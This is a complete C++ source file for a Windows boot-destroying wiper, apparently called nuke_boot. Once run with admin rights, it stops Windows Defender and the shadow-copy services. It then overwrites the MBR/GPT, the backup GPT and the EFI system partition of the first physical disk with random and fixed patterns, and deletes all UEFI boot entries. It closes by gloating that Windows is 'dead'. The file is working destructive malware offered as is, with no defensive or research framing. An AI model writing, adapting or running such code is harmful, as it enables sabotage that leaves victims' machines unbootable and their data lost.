#define _UNICODE
#define UNICODE
#include <windows.h>
#include <securitybaseapi.h>
#include <iostream>
#include <random>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>

void WriteError(const char* msg, DWORD errorCode) {
    std::cerr << "Error: " << msg << " (Code: " << errorCode << ")\n";
    ExitProcess(1);
}

bool OverwriteSector(HANDLE hDisk, LARGE_INTEGER offset, BYTE* buffer, DWORD size, DWORD& errorCode) {
    for (int attempt = 0; attempt < 3; ++attempt) {
        SetFilePointerEx(hDisk, offset, nullptr, FILE_BEGIN);
        DWORD bytesWritten;
        if (WriteFile(hDisk, buffer, size, &bytesWritten, nullptr) && bytesWritten == size) {
            FlushFileBuffers(hDisk);
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    return false;
}

bool LockVolume(HANDLE hVolume, DWORD& errorCode) {
    for (int attempt = 0; attempt < 3; ++attempt) {
        DWORD bytesReturned;
        if (DeviceIoControl(hVolume, FSCTL_LOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    return false;
}

bool DismountVolume(HANDLE hVolume, DWORD& errorCode) {
    FlushFileBuffers(hVolume);
    for (int attempt = 0; attempt < 3; ++attempt) {
        DWORD bytesReturned;
        if (DeviceIoControl(hVolume, FSCTL_DISMOUNT_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    return false;
}

bool ClearUEFIBootEntries(DWORD& errorCode) {
    for (int attempt = 0; attempt < 3; ++attempt) {
        // Clear BootOrder first
        BYTE emptyBootOrder[1] = {0};
        if (SetFirmwareEnvironmentVariableW(L"BootOrder", L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", emptyBootOrder, 0)) {
            // enumerate and delete Boot#### entries
            BYTE buffer[4096];
            DWORD bufferSize = sizeof(buffer);
            for (int i = 0; i < 0xFFFF; ++i) {
                wchar_t bootVarName[16];
                swprintf_s(bootVarName, L"Boot%04X", i);
                // Attempt to get the firmware entry
                if (GetFirmwareEnvironmentVariableW(bootVarName, L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", buffer, bufferSize) == 0) {
                    DWORD err = GetLastError();
                    
                    if (err == ERROR_INVALID_FUNCTION) {
                        std::cerr << "ERROR INVALID FUNCTION: " << err << "\n";
                    }
                    else if (err == ERROR_ACCESS_DENIED) {
                        std::cerr << "ERROR ACCESS DENIED while reading UEFI boot entry " << bootVarName << ": " << err << "\n";
                        continue;  
                    }
                    else if (err == ERROR_INVALID_PARAMETER) {
                        std::cerr<<"INVALID PARAMETER " << bootVarName << ": " << err << "\n";
                        continue;  
                    }

                    std::cerr << "Error while reading UEFI boot entry " << bootVarName << ": " << err << std::endl;

                    break;
                }

                if (SetFirmwareEnvironmentVariableW(bootVarName, L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", nullptr, 0)) {
                    std::cout << "Deleted: " << bootVarName << std::endl;
                } else {
                    std::cerr << "Failed to delete: " << bootVarName << std::endl;
                }
            }
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::cerr << "Warning: Failed to clear UEFI boot entries (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Retry after 500 ms
    }
    return false;
}

bool EnablePrivilege(const wchar_t* privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(nullptr, privilege, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        CloseHandle(hToken);
        return false;
    }
    CloseHandle(hToken);
    return true;
}

bool IsElevated() {
    HANDLE hToken = nullptr;
    PSID adminSid = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    BOOL isMember = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        WriteError("Cannot open process token", GetLastError());
    }

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid)) {
        CloseHandle(hToken);
        WriteError("Cannot initialize admin SID", GetLastError());
    }

    if (!CheckTokenMembership(nullptr, adminSid, &isMember)) {
        FreeSid(adminSid);
        CloseHandle(hToken);
        WriteError("Cannot check token membership", GetLastError());
    }

    FreeSid(adminSid);
    CloseHandle(hToken);
    return isMember != FALSE;
}

bool IsServiceStopped(const wchar_t* serviceName, bool& stopped) {
    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return false;
    SC_HANDLE hService = OpenServiceW(hSCManager, serviceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }
    SERVICE_STATUS status;
    bool success = QueryServiceStatus(hService, &status);
    stopped = (status.dwCurrentState == SERVICE_STOPPED);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return success;
}

bool StopService(const wchar_t* serviceName) {
    bool stopped;
    if (IsServiceStopped(serviceName, stopped) && stopped) {
        std::wcout << serviceName << L" service already stopped.\n";
        return true;
    }
    for (int attempt = 0; attempt < 3; ++attempt) {
        SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!hSCManager) continue;
        SC_HANDLE hService = OpenServiceW(hSCManager, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            continue;
        }
        SERVICE_STATUS status;
        bool success = ControlService(hService, SERVICE_CONTROL_STOP, &status);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        if (success) {
            std::wcout << serviceName << L" service stopped.\n";
            return true;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    HANDLE hNull = CreateFileW(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_ALWAYS, 0, nullptr);
    if (hNull == INVALID_HANDLE_VALUE) return false;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hNull;
    si.hStdError = hNull;
    std::wstring cmdLine = L"C:\\Windows\\System32\\net.exe stop " + std::wstring(serviceName);
    bool success = CreateProcessW(L"C:\\Windows\\System32\\net.exe", const_cast<LPWSTR>(cmdLine.c_str()), nullptr, nullptr, TRUE, 
                                 CREATE_NO_WINDOW, nullptr, L"C:\\Windows\\System32", &si, &pi);
    if (success) {
        WaitForSingleObject(pi.hProcess, 10000); // 10s timeout
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hNull);
        if (exitCode == 0) {
            std::wcout << serviceName << L" service stopped via net stop.\n";
            return true;
        }
    }
    CloseHandle(hNull);
    return false;
}

bool RandomizePartitionGUIDs(HANDLE hDisk, DRIVE_LAYOUT_INFORMATION_EX* layout, DWORD partitionCount, DWORD& errorCode) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    BYTE* guidBuffer = new BYTE[16];
    for (DWORD i = 0; i < partitionCount; ++i) {
        for (int j = 0; j < 16; ++j) guidBuffer[j] = dis(gen);
        memcpy(&layout->PartitionEntry[i].Gpt.PartitionId, guidBuffer, 16);
    }
    delete[] guidBuffer;
    DWORD bytesReturned;
    for (int attempt = 0; attempt < 3; ++attempt) {
        if (DeviceIoControl(hDisk, IOCTL_DISK_SET_DRIVE_LAYOUT_EX, layout, 
                            sizeof(DRIVE_LAYOUT_INFORMATION_EX) + (partitionCount - 1) * sizeof(PARTITION_INFORMATION_EX), 
                            nullptr, 0, &bytesReturned, nullptr)) {
            errorCode = 0;
            return true;
        }
        errorCode = GetLastError();
        std::cerr << "Warning: Failed to randomize partition GUIDs (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    return false;
}

int main() {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);

    if (!IsElevated()) {
        WriteError("Must run as elevated Administrator. Use 'runas /user:Administrator nuke_boot.exe' or elevated prompt.", 0);
    }

    // Enable privileges
    if (!EnablePrivilege(L"SeManageVolumePrivilege")) {
        std::cerr << "Failed to enable SeManageVolumePrivilege. May affect disk writes.\n";
    }
    if (!EnablePrivilege(L"SeSecurityPrivilege")) {
        std::cerr << "Failed to enable SeSecurityPrivilege. May affect service stops.\n";
    }
    if (!EnablePrivilege(L"SeSystemEnvironmentPrivilege")) {
        std::cerr << "Failed to enable SeSystemEnvironmentPrivilege. May affect UEFI boot entry removal.\n";
    }

    // Stop services
    StopService(L"VSS");
    StopService(L"WinDefend");
    StopService(L"VolSnap");

    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDisk == INVALID_HANDLE_VALUE) WriteError("Cannot open PhysicalDrive0", GetLastError());

    DISK_GEOMETRY_EX diskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeometry, 
                         sizeof(diskGeometry), &bytesReturned, nullptr)) {
        WriteError("Cannot get disk geometry", GetLastError());
    }

    const int SECTOR_SIZE = 512;
    const int SECTORS_TO_NUKE = 2048; // 1 MB
    const int GPT_BACKUP_SECTORS = 512;
    const int ESP_SECTORS = 200; // 100 MB
    BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
    if (!buffer) WriteError("Failed to allocate buffer", 0);
    BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
    if (!gptBuffer) WriteError("Failed to allocate GPT buffer", 0);
    BYTE* espBuffer = new BYTE[SECTOR_SIZE * ESP_SECTORS];
    if (!espBuffer) WriteError("Failed to allocate ESP buffer", 0);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    struct NukeStatus {
        std::string name;
        bool success;
    };
    std::vector<NukeStatus> status = {
        {"MBR/GPT Primary", true},
        {"GPT Backup", true},
        {"EFI Partition", true},
        {"UEFI Boot Entries", true}
    };

    bool isGPT = false;
    BYTE layoutBuffer[4096];
    DRIVE_LAYOUT_INFORMATION_EX* layout = (DRIVE_LAYOUT_INFORMATION_EX*)layoutBuffer;
    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX, nullptr, 0, layout, 
                        sizeof(layoutBuffer), &bytesReturned, nullptr)) {
        isGPT = (layout->PartitionStyle == PARTITION_STYLE_GPT);
    } else {
        std::cerr << "Warning: Cannot get partition layout, assuming GPT (Code: " << GetLastError() << ")\n";
        isGPT = true;
        status[2].success = false;
        status[3].success = false;
    }
    
    // randomize partition GUIDs
    DWORD errorCode;
    // if (isGPT && status[2].success) {
    //     if (LockVolume(hDisk, errorCode)) {
    //         if (!RandomizePartitionGUIDs(hDisk, layout, layout->PartitionCount, errorCode)) {
    //             status[2].success = false;
    //         } else {
    //             std::cout << "Partition GUIDs randomized.\n";
    //         }
    //         DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
    //     } else {
    //         status[2].success = false;
    //     }
    // }

    // Nuke MBR/GPT
    if (LockVolume(hDisk, errorCode)) {
        for (int pass = 0; pass < 4; ++pass) {
            if (pass == 0 || pass == 3) {
                for (int i = 0; i < SECTOR_SIZE * SECTORS_TO_NUKE; ++i) buffer[i] = dis(gen);
            } else if (pass == 1) {
                ZeroMemory(buffer, SECTOR_SIZE * SECTORS_TO_NUKE);
            } else {
                memset(buffer, 0xFF, SECTOR_SIZE * SECTORS_TO_NUKE);
            }
            if (!OverwriteSector(hDisk, {0}, buffer, SECTOR_SIZE * SECTORS_TO_NUKE, errorCode)) {
                status[0].success = false;
            }
        }
        if (!DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
            DWORD errorCode = GetLastError();
            std::cerr << "FSCTL_UNLOCK_VOLUME failed. Error code: " << errorCode << std::endl;
            if (errorCode == ERROR_ACCESS_DENIED) {
                std::cerr << "The volume is in use by another process." << std::endl;
            }
        } else {
            std::cout << "Volume unlocked successfully." << std::endl;
        }
    } else {
        status[0].success = false;
    }

    // Nuke GPT Backup
    if (isGPT) {
        LARGE_INTEGER gptBackupOffset;
        gptBackupOffset.QuadPart = diskGeometry.DiskSize.QuadPart - SECTOR_SIZE * GPT_BACKUP_SECTORS;
        if (gptBackupOffset.QuadPart < 0) WriteError("Invalid GPT backup offset", 0);
        if (LockVolume(hDisk, errorCode)) {
            for (int pass = 0; pass < 4; ++pass) {
                if (pass == 0 || pass == 3) {
                    for (int i = 0; i < SECTOR_SIZE * GPT_BACKUP_SECTORS; ++i) gptBuffer[i] = dis(gen);
                } else if (pass == 1) {
                    ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS);
                } else {
                    memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_BACKUP_SECTORS);
                }
                if (!OverwriteSector(hDisk, gptBackupOffset, gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS, errorCode)) {
                    status[1].success = false;
                }
            }
            if (!DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
                DWORD errorCode = GetLastError();
                std::cerr << "FSCTL_UNLOCK_VOLUME failed. Error code: " << errorCode << std::endl;
                if (errorCode == ERROR_ACCESS_DENIED) {
                    std::cerr << "The volume is in use by another process." << std::endl;
                }
            } else {
                std::cout << "Volume unlocked successfully." << std::endl;
            }
        } else {
            status[1].success = false;
        }
    }

    // Nuke EFI Partition
    if (isGPT && status[2].success) {
        const GUID ESP_GUID = {0xC12A7328, 0xF81F, 0x11D2, {0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B}};
        LARGE_INTEGER espOffset = {0};
        bool espFound = false;
    
        // Check and find the ESP partition
        for (DWORD i = 0; i < layout->PartitionCount; ++i) {
            if (std::memcmp(&layout->PartitionEntry[i].Gpt.PartitionType, &ESP_GUID, sizeof(GUID)) == 0) {
                espOffset.QuadPart = layout->PartitionEntry[i].StartingOffset.QuadPart;
                espFound = true;
                break;
            }
        }
    
        // If ESP found, validate its offset
        if (espFound && espOffset.QuadPart > 0 && espOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
            if (LockVolume(hDisk, errorCode)) {
                for (int pass = 0; pass < 4; ++pass) {
                    // Set espBuffer to appropriate data based on the pass
                    if (pass == 0 || pass == 3) {
                        for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) espBuffer[j] = dis(gen);
                    } else if (pass == 1) {
                        ZeroMemory(espBuffer, SECTOR_SIZE * ESP_SECTORS);
                    } else {
                        memset(espBuffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
                    }
                
                    // Overwrite ESP sectors
                    if (!OverwriteSector(hDisk, espOffset, espBuffer, SECTOR_SIZE * ESP_SECTORS, errorCode)) {
                        status[2].success = false;
                        break;
                    }
                }
            
                // Unlock the volume after overwriting
                if (!DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
                    DWORD errorCode = GetLastError();
                    std::cerr << "FSCTL_UNLOCK_VOLUME failed for ESP. Error code: " << errorCode << std::endl;
                    if (errorCode == ERROR_ACCESS_DENIED) {
                        std::cerr << "The volume is in use by another process." << std::endl;
                    }
                } else {
                    std::cout << "ESP volume unlocked successfully." << std::endl;
                }
            } else {
                status[2].success = false;
                std::cerr << "Failed to lock the ESP volume. Error code: " << errorCode << std::endl;
            }
        } else {
            status[2].success = false;
            std::cerr << "ESP partition not found or invalid offset." << std::endl;
        }
    }

    // Clear UEFI Boot Entries
    if (status[3].success) {
        if (!ClearUEFIBootEntries(errorCode)) {
            status[3].success = false;
        }
    }

    delete[] buffer;
    delete[] gptBuffer;
    delete[] espBuffer;
    CloseHandle(hDisk);

    std::cout << "\n=== Nuke Status Report ===\n";
    bool allSucceeded = true;
    for (const auto& s : status) {
        std::cout << s.name << ": " << (s.success ? "Succeeded" : "Failed") << "\n";
        if (!s.success) allSucceeded = false;
    }
    std::cout << "Overall: " << (allSucceeded ? "Fully Succeeded" : "Partial Success") << "\n";
    std::cout << "Boot sector, EFI partition, and UEFI boot entries fucking obliterated. Windows is dead as shit. 😈\n";

    return 0;
}